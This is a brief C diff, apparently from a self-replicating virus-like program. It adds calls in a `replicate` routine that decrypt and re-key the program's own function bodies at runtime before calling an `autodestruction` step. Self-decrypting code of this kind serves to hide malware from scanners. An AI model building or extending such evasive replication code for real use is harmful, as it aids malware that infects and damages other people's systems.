@@ -6,10 +6,11 @@
 
 void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-
 #if LOGGER
 	EXIT_LOGGER("autodestruction:\t");
 #endif
+
+	decrypt_right(keychain, (char *)clean, (void *)replicate - (void *)clean);
 
 //	if (context == FAILURE)
 		goto label;
@@ -36,5 +37,8 @@ void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context 
 		_wait4(child, NULL, WSTOPPED, NULL);
 
 label:
+	update_keychain_right(keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
+	decrypt_right(keychain, (char *)autodestruction, (void *)execution - (void *)autodestruction);
+
 	autodestruction(host, keychain, context);
 }
